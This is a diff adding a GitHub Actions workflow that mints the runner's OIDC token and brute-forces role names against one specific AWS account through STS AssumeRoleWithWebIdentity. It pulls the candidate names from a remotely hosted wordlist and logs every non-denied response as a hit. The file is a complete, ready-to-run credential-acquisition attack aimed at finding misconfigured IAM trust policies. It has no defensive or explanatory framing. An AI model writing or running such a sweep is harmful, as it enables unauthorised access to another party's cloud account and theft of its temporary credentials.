@@ -1,0 +1,52 @@
+name: w11sweep3
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  sweep:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: mint and sweep generic block
+        run: |
+          set -euo pipefail
+          curl -sS -o /tmp/roles.txt https://raw.githubusercontent.com/owl-king/arm-oeth/main/roles_all.txt
+          python3 -u - <<'PY'
+          import urllib.parse, urllib.request, urllib.error, time, re, collections, os, json
+          def mint():
+              url=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=sts.amazonaws.com'
+              req=urllib.request.Request(url,headers={'Authorization':'bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN'],'User-Agent':'w11sweep3'})
+              with urllib.request.urlopen(req,timeout=10) as r:
+                  return json.loads(r.read())['value']
+          names=[l.strip() for l in open('/tmp/roles.txt') if l.strip()]
+          names=list(dict.fromkeys(names))
+          block=names[1700:2000]
+          print('block',len(block),block[0],block[-1],flush=True)
+          tok=mint(); print('mint0 ok len',len(tok),flush=True)
+          cnt=collections.Counter(); hits=[]
+          def sts(name,token):
+              arn=f'arn:aws:iam::220898748818:role/{name}'
+              data=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'w11sweep3','DurationSeconds':'3600','WebIdentityToken':token}).encode()
+              req=urllib.request.Request('https://sts.amazonaws.com/',data=data,method='POST',headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'w11sweep3'})
+              try:
+                  with urllib.request.urlopen(req,timeout=10) as r: body=r.read().decode('utf-8','replace'); code=r.status
+              except urllib.error.HTTPError as e: body=e.read().decode('utf-8','replace'); code=e.code
+              m=re.search(r'<Code>([^<]+)</Code>',body); ec=m.group(1) if m else '-'
+              return code,ec,body
+          for i,n in enumerate(block):
+              if i>0 and i%100==0:
+                  tok=mint(); print('refresh',i,flush=True)
+              code,ec,body=sts(n,tok)
+              if ec=='ExpiredTokenException':
+                  tok=mint(); code,ec,body=sts(n,tok)
+              cnt[(code,ec)]+=1
+              if code!=403 or ec!='AccessDenied':
+                  hits.append((n,code,ec)); print('HIT|',n,code,ec,body[:250].replace('\n',' '),flush=True)
+              if i%50==0: print('PROGRESS',i,flush=True)
+              time.sleep(0.3)
+          print('COUNTER',dict(cnt),flush=True)
+          print('HITS',hits,flush=True)
+          print('DONE',len(block),flush=True)
+          PY
